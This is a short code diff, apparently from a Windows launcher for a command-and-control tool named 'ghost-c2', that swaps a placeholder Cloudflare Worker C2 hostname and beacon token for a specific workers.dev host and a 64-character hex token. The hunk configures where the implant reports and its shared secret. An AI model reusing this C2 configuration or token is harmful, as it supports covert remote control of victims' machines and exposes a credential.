@@ -28,10 +28,8 @@
 
 // Your Cloudflare Worker hostname — no https://, no trailing slash
 // Example: L"ghost-c2.yourname.workers.dev"
-static const wchar_t* LAUNCHER_C2_HOST = L"ghost-c2.yourname.workers.dev";
-
-// Must match BEACON_TOKEN secret set via: wrangler secret put BEACON_TOKEN
-static const wchar_t* LAUNCHER_BEACON_TOKEN = L"4f8c9b2a7e1d5f3c6a8b9e0d2f4c1a3b5e7d9f8c0b1a2d3e4f5a6b7c8d9e0f1";
+static const wchar_t* LAUNCHER_C2_HOST    = L"ghost-c2.sujallamichhane.workers.dev";
+static const wchar_t* LAUNCHER_BEACON_TOKEN = L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260";
 
 // ---------------------------------------------------------------------------
 // Constants
